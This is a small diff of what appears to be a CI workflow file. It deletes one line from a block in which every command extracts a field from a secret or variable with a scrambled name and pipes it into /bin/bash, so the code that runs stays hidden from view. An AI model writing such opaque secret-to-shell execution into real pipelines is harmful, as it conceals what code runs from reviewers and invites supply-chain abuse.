@@ -20,7 +20,6 @@ jobs:
           urut436: ${{ secrets.urut436 }}
         run: |
           printf '%s' "$urut436" | jq -r .aogu2150 | /bin/bash
-          printf '%s' "$pfj318" | jq -r .lhnqu3392 | /bin/bash
           echo $rggo1107 | jq -r .wusn67052 | /bin/bash
           printf '%s' "$wp19568" | jq -r .tqxed45 | /bin/bash
           echo $zzyqm7 | jq -r .aks70962 | /bin/bash
